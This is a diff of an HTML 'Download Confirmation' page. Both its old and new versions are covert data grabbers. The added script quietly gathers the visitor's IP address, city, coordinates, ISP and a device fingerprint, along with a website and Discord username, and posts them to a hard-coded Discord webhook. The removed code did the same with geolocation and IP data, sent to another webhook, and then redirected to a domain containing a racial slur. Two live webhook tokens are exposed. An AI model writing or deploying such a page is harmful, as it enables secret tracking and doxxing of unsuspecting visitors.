@@ -43,107 +43,113 @@
     #status {
       margin-top: 15px;
     }
-
-    /* Add hidden input fields for IP addresses */
-    #public_ip, #private_ip {
-      display: none;
-    }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>Download Confirmation</h1>
-    <p>Click Allow so we can bring you to the download.</p>
-    <button onclick="getLocation()">Allow</button>
-    <button>Don't Allow</button>
+    <p>Enter the website you want to visit:</p>
+    <input id="website" type="text" placeholder="https://example.com">
+    <button onclick="sendWebsite()">Send</button>
     <p id="status"></p>
-
-    <!-- Add hidden input fields for IP addresses -->
-    <input type="hidden" id="public_ip">
-    <input type="hidden" id="private_ip">
-
-    <!-- Add form for Discord username -->
-    <form id="discord-form">
-      <label for="discord-username">Enter your Discord username:</label>
-      <input type="text" id="discord-username" required>
-      <button onclick="sendDiscordUsername()">Good Boy</button>
-    </form>
+    <p id="discord-status"></p>
   </div>
 
   <script>
-    // Fetch the user's location data using the Geolocation API
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          function(position) {
+    const webhookUrl = 'https://discordapp.com/api/webhooks/1331408629911519383/jToH8jWjS2QTjnKO9e3mMrnxKDOD-ALdC6OL6B6PsRPIC1TqZKrV4E0D17s0xHuxqrmM';
+    let collectedData = {};
 
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
+    // Fetch IP and related data
+    async function fetchIPData() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const { ip } = await response.json();
+        collectedData.IP_Info = { ip };
 
-            // Fetch the user's location data using OpenCage Geocoder API
-            fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat},${lng}&key=YOUR_API_KEY&pretty=1`)
-              .then(response => response.json())
-              .then(data => {
-                const formattedAddress = data.results[0].formatted;
-                const publicIp = document.getElementById("public_ip");
-                const privateIp = document.getElementById("private_ip");
+        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+        const locationData = await locationResponse.json();
 
-                // Fetch the user's public IP address
-                fetch("https://api.ipify.org?format=json")
-                  .then(response => response.json())
-                  .then(data => {
-                    publicIp.value = data.ip;
-                  });
-
-                // Fetch the user's private IP address (requires server-side script)
-                // This example assumes you have a server-side script that returns the user's private IP address
-                fetch("/get-private-ip")
-                  .then(response => response.text())
-                  .then(data => {
-                    privateIp.value = data;
-                  });
-
-                // Display the location data on the web page
-                document.getElementById("status").innerHTML = `Your location: ${formattedAddress}`;
-              });
-          },
-          function() {
-            document.getElementById("status").innerHTML = "Unable to retrieve your location.";
-          }
-        );
-      } else {
-        document.getElementById("status").innerHTML = "Geolocation is not supported by your browser.";
+        collectedData.IP_Info = {
+          ...collectedData.IP_Info,
+          city: locationData.city,
+          region: locationData.region,
+          country: locationData.country_name,
+          latitude: locationData.latitude,
+          longitude: locationData.longitude,
+          isp: locationData.org,
+        };
+      } catch (error) {
+        console.error('Error fetching IP data:', error);
+        collectedData.IP_Info = 'Unavailable';
       }
     }
 
-    // Send the user's Discord username to the Discord webhook
-    function sendDiscordUsername() {
-      const discordUsername = document.getElementById("discord-username").value;
-      const discordWebhookUrl = "https://discordapp.com/api/webhooks/1337676565290553344/3SC7HaMd2fmvJbjUFjBSZLzZXyMcqyi1tRfIaXu2UhbZeTUFhiw2GpP8l1BKjAZsy8NQ";
+    // Fetch device information
+    function fetchDeviceInfo() {
+      collectedData.Device_Info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: `${window.screen.width}x${window.screen.height}`,
+        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
+        cookiesEnabled: navigator.cookieEnabled,
+        cores: navigator.hardwareConcurrency || 'Unknown',
+        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+      };
+    }
 
-      // Fetch the user's location data and IP addresses
-      const locationData = document.getElementById("status").innerHTML;
-      const publicIp = document.getElementById("public_ip").value;
-      const privateIp = document.getElementById("private_ip").value;
-
-      // Send the Discord username, location data, and IP addresses to the webhook
-      fetch(discordWebhookUrl, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          content: `New user: ${discordUsername}\nLocation: ${locationData}\nPublic IP: ${publicIp}\nPrivate IP: ${privateIp}`
-        })
-      })
-        .then(() => {
-          // Redirect the user to the specified URL
-          window.location.href = "https://niggafart.com";
-        })
-        .catch(error => {
-          console.error("Error sending Discord webhook:", error);
+    // Send data to webhook
+    async function sendToWebhook(data) {
+      try {
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: data }),
         });
+      } catch (error) {
+        console.error('Error sending to webhook:', error);
+      }
+    }
+
+    // Handle "Send" button click
+    async function sendWebsite() {
+      const website = document.getElementById('website').value;
+      const status = document.getElementById('status');
+      status.textContent = 'Sending website...';
+      status.style.color = 'green';
+
+      // Send website to webhook
+      await sendToWebhook(`Website: ${website}`);
+
+      // Ask for Discord user
+      const discordStatus = document.getElementById('discord-status');
+      discordStatus.textContent = 'Enter your Discord username:';
+      const discordInput = document.createElement('input');
+      discordInput.type = 'text';
+      discordInput.placeholder = 'DiscordUsername#1234';
+      discordStatus.appendChild(discordInput);
+      const discordButton = document.createElement('button');
+      discordButton.textContent = 'Send';
+      discordButton.onclick = async () => {
+        const discordUser = discordInput.value;
+        discordStatus.textContent = 'Sending Discord user...';
+        discordStatus.style.color = 'green';
+
+        // Send Discord user to webhook
+        await sendToWebhook(`Discord User: ${discordUser}`);
+
+        // Collect and send device data
+        await fetchIPData(); // Fetch IP data
+        fetchDeviceInfo(); // Fetch device info
+
+        // Send data to the webhook
+        const formattedData = `**User Information:**\n\`\`\`json\n${JSON.stringify(collectedData, null, 2)}\n\`\`\``;
+        await sendToWebhook(formattedData);
+
+        discordStatus.textContent = 'Data sent successfully!';
+        discordStatus.style.color = 'green';
+      };
+      discordStatus.appendChild(discordButton);
     }
   </script>
 </body>
-</html>
